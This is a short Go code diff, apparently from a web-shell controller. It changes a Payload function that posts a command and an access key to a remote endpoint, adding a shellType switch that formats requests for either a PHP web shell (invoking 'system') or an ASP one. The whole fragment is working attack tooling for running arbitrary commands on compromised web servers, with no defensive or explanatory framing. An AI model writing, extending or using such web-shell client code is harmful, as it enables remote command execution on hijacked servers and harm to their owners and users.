@@ -12,15 +12,23 @@ import (
 )
 
 // Payload ...
-func (s *Service) Payload(endpoint string, key string, command string, timeOut time.Duration) (string, error) {
+func (s *Service) Payload(endpoint string, key string, command string, shellType string, timeOut time.Duration) (string, error) {
 	client := http.Client{
 		Timeout: time.Duration(timeOut * time.Second),
 	}
 
 	params := url.Values{}
-	params.Set("0", "system")
-	params.Set("1", command)
-	params.Set("2", key)
+
+	if shellType == "php" {
+		params.Set("0", "system")
+		params.Set("1", command)
+		params.Set("2", key)
+	}
+
+	if shellType == "asp" {
+		params.Set("0", command)
+		params.Set("1", key)
+	}
 
 	payload := bytes.NewBufferString(params.Encode())
 
